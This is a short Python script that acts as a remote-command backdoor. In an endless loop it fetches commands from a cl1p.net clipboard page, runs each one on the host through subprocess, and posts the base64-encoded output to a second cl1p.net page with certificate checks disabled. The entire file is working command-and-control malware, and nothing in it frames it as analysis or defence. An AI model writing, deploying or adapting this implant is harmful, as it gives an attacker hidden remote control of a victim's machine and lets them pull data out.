import requests
from bs4 import BeautifulSoup
import subprocess
import base64
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RESPONSE_ID = "REDACTED_ID"
COMMAND_ID = "REDACTED_ID"


def execute_system_command(cmd):
    output = subprocess.getstatusoutput(cmd)
    return output

while True:
    response = requests.get('https://cl1p.net/'+COMMAND_ID, verify=False)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        textarea = soup.find('textarea', {'id': 'cl1pTextArea'})

        if textarea:
            content = textarea.get_text().strip()
            output = execute_system_command(content)[1]
            data = {
            'ttl': '0',
            'content': base64.b64encode(output.encode()).decode(),
            }

            response = requests.post('https://cl1p.net/'+RESPONSE_ID, data=data, verify=False)
        else:
            time.sleep(1)
